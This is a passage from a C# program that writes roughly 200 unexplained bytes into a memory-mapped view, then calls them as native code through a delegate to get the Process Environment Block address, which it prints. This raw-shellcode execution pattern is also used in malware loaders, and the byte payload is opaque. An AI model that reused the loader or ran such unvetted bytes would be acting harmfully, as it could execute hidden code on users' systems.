mmva.Write(740, ((byte)0x1e));
mmva.Write(741, ((byte)0x34));
mmva.Write(742, ((byte)0x0f));
mmva.Write(743, ((byte)0xb6));
mmva.Write(744, ((byte)0x3d));
mmva.Write(745, ((byte)0x6c));
mmva.Write(746, ((byte)0xaf));
mmva.Write(747, ((byte)0x6e));
mmva.Write(748, ((byte)0xfd));
mmva.Write(749, ((byte)0xed));
mmva.Write(750, ((byte)0x3f));
mmva.Write(751, ((byte)0xee));
mmva.Write(752, ((byte)0x0a));
mmva.Write(753, ((byte)0xa4));
mmva.Write(754, ((byte)0x15));
mmva.Write(755, ((byte)0x9f));
mmva.Write(756, ((byte)0x97));
mmva.Write(757, ((byte)0xbb));
mmva.Write(758, ((byte)0xec));
mmva.Write(759, ((byte)0x5c));
mmva.Write(760, ((byte)0x08));
mmva.Write(761, ((byte)0x20));
mmva.Write(762, ((byte)0x67));
mmva.Write(763, ((byte)0xc6));
mmva.Write(764, ((byte)0xde));
mmva.Write(765, ((byte)0x48));
mmva.Write(766, ((byte)0x10));
mmva.Write(767, ((byte)0xfa));
mmva.Write(768, ((byte)0xfc));
mmva.Write(769, ((byte)0xa2));
mmva.Write(770, ((byte)0x26));
mmva.Write(771, ((byte)0x9f));
mmva.Write(772, ((byte)0x97));
mmva.Write(773, ((byte)0xf2));
mmva.Write(774, ((byte)0x9a));
mmva.Write(775, ((byte)0x69));
mmva.Write(776, ((byte)0x2f));
mmva.Write(777, ((byte)0x15));
mmva.Write(778, ((byte)0xe6));
mmva.Write(779, ((byte)0xcc));
mmva.Write(780, ((byte)0xcd));
mmva.Write(781, ((byte)0xba));
mmva.Write(782, ((byte)0xec));
mmva.Write(783, ((byte)0x4d));
mmva.Write(784, ((byte)0x2f));
mmva.Write(785, ((byte)0x15));
mmva.Write(786, ((byte)0xef));
mmva.Write(787, ((byte)0xd2));
mmva.Write(788, ((byte)0xa6));
mmva.Write(789, ((byte)0x3b));
mmva.Write(790, ((byte)0x36));
mmva.Write(791, ((byte)0xef));
mmva.Write(792, ((byte)0x2b));
mmva.Write(793, ((byte)0xe3));
mmva.Write(794, ((byte)0xe4));
mmva.Write(795, ((byte)0xb2));
mmva.Write(796, ((byte)0x91));
mmva.Write(797, ((byte)0xea));
mmva.Write(798, ((byte)0x1e));
mmva.Write(799, ((byte)0x43));
mmva.Write(800, ((byte)0xb7));
mmva.Write(801, ((byte)0xa1));
mmva.Write(802, ((byte)0xe6));
mmva.Write(803, ((byte)0xea));
mmva.Write(804, ((byte)0x88));
mmva.Write(805, ((byte)0xba));
mmva.Write(806, ((byte)0xa2));
mmva.Write(807, ((byte)0x7d));
mmva.Write(808, ((byte)0xea));
mmva.Write(809, ((byte)0x37));
mmva.Write(810, ((byte)0x26));
mmva.Write(811, ((byte)0x9f));
mmva.Write(812, ((byte)0xde));
mmva.Write(813, ((byte)0x48));
mmva.Write(814, ((byte)0x21));
mmva.Write(815, ((byte)0x4c));
mmva.Write(816, ((byte)0x57));
mmva.Write(817, ((byte)0xc4));
mmva.Write(818, ((byte)0x26));
mmva.Write(819, ((byte)0x9f));
mmva.Write(820, ((byte)0x97));
mmva.Write(821, ((byte)0xf2));
mmva.Write(822, ((byte)0x9a));
mmva.Write(823, ((byte)0x69));
mmva.Write(824, ((byte)0x2a));
mmva.Write(825, ((byte)0xdb));
mmva.Write(826, ((byte)0xe9));
mmva.Write(827, ((byte)0xeb));
mmva.Write(828, ((byte)0x95));
mmva.Write(829, ((byte)0x19));
mmva.Write(830, ((byte)0xcf));
mmva.Write(831, ((byte)0x54));
mmva.Write(832, ((byte)0x37));
mmva.Write(833, ((byte)0x24));
mmva.Write(834, ((byte)0x26));
mmva.Write(835, ((byte)0x9f));
mmva.Write(836, ((byte)0xc4));
mmva.Write(837, ((byte)0xab));
mmva.Write(838, ((byte)0x0f));
mmva.Write(839, ((byte)0xfc));
mmva.Write(840, ((byte)0x38));
mmva.Write(841, ((byte)0x6d));
mmva.Write(842, ((byte)0xaf));
mmva.Write(843, ((byte)0x4e));
mmva.Write(844, ((byte)0x56));
mmva.Write(845, ((byte)0x10));
mmva.Write(846, ((byte)0x75));
mmva.Write(847, ((byte)0xf5));
mmva.Write(848, ((byte)0xa5));
mmva.Write(849, ((byte)0xe4));
mmva.Write(850, ((byte)0x26));
mmva.Write(851, ((byte)0x8f));
mmva.Write(852, ((byte)0x97));
mmva.Write(853, ((byte)0xf2));
mmva.Write(854, ((byte)0x2c));
mmva.Write(855, ((byte)0x06));
mmva.Write(856, ((byte)0x3a));
mmva.Write(857, ((byte)0x80));
mmva.Write(858, ((byte)0x75));
mmva.Write(859, ((byte)0x7a));
mmva.Write(860, ((byte)0x97));
mmva.Write(861, ((byte)0xf2));
mmva.Write(862, ((byte)0x65));
mmva.Write(863, ((byte)0xbc));
mmva.Write(864, ((byte)0x9d));
mmva.Write(865, ((byte)0xf1));
mmva.Write(866, ((byte)0x6e));
mmva.Write(867, ((byte)0x0c));
mmva.Write(868, ((byte)0xc4));
mmva.Write(869, ((byte)0xa1));
mmva.Write(870, ((byte)0x2d));
mmva.Write(871, ((byte)0x35));
mmva.Write(872, ((byte)0x85));
mmva.Write(873, ((byte)0x6c));
mmva.Write(874, ((byte)0xaf));
mmva.Write(875, ((byte)0x6e));
mmva.Write(876, ((byte)0xdf));
mmva.Write(877, ((byte)0x7b));
mmva.Write(878, ((byte)0xbf));
mmva.Write(879, ((byte)0xf5));
mmva.Write(880, ((byte)0xa5));
mmva.Write(881, ((byte)0xe4));
mmva.Write(882, ((byte)0x26));
mmva.Write(883, ((byte)0xbf));
mmva.Write(884, ((byte)0x97));
mmva.Write(885, ((byte)0xf2));
mmva.Write(886, ((byte)0x2c));
mmva.Write(887, ((byte)0x35));
mmva.Write(888, ((byte)0x9b));
mmva.Write(889, ((byte)0x6d));
mmva.Write(890, ((byte)0x9c));
mmva.Write(891, ((byte)0x8d));
mmva.Write(892, ((byte)0x01));
mmva.Write(893, ((byte)0x7b));
mmva.Write(894, ((byte)0x87));
mmva.Write(895, ((byte)0xbc));
mmva.Write(896, ((byte)0x62));
mmva.Write(897, ((byte)0x24));
mmva.Write(898, ((byte)0x26));
mmva.Write(899, ((byte)0x60));
mmva.Write(900, ((byte)0x42));
mmva.Write(901, ((byte)0xba));
mmva.Write(902, ((byte)0xe6));
mmva.Write(903, ((byte)0x78));
mmva.Write(904, ((byte)0x42));
mmva.Write(905, ((byte)0xa1));
mmva.Write(906, ((byte)0xe6));
mmva.Write(907, ((byte)0xeb));
mmva.Write(908, ((byte)0x25));
mmva.Write(909, ((byte)0x94));
mmva.Write(910, ((byte)0xee));
mmva.Write(911, ((byte)0xbb));
mmva.Write(912, ((byte)0x2a));
mmva.Write(913, ((byte)0x25));
mmva.Write(914, ((byte)0xe5));
mmva.Write(915, ((byte)0x1a));
mmva.Write(916, ((byte)0x57));
mmva.Write(917, ((byte)0x87));
mmva.Write(918, ((byte)0xb7));
mmva.Write(919, ((byte)0xe4));
mmva.Write(920, ((byte)0xa1));
mmva.Write(921, ((byte)0x7c));
mmva.Write(922, ((byte)0x4c));
mmva.Write(923, ((byte)0x9f));
mmva.Write(924, ((byte)0xce));
mmva.Write(925, ((byte)0xbb));
mmva.Write(926, ((byte)0xa2));
mmva.Write(927, ((byte)0x7e));
mmva.Write(928, ((byte)0x92));
mmva.Write(929, ((byte)0x91));
mmva.Write(930, ((byte)0x84));
mmva.Write(931, ((byte)0xc9));
mmva.Write(932, ((byte)0x68));
mmva.Write(933, ((byte)0x27));
mmva.Write(934, ((byte)0x65));
mmva.Write(935, ((byte)0xbc));
mmva.Write(936, ((byte)0x62));
mmva.Write(937, ((byte)0x24));
mmva.Write(938, ((byte)0x26));
mmva.Write(939, ((byte)0x49));
mmva.Write(940, ((byte)0x9f));
mmva.Write(941, ((byte)0x65));
mmva.Write(942, ((byte)0x15));

			 
				var pointer = (byte*)0;
				mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);
 
				var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), typeof(GetPebDelegate));
 
				return func();
			}
			catch
			{
				return IntPtr.Zero;
			}
			finally
			{
				mmva.Dispose();
				mmf.Dispose();
			}
		}
 
		static void Main(string[] args)
		{
			var peb = GetPeb();
			Console.WriteLine("PEB is located at: {0:X8}", peb.ToInt32());
		}
	}
}

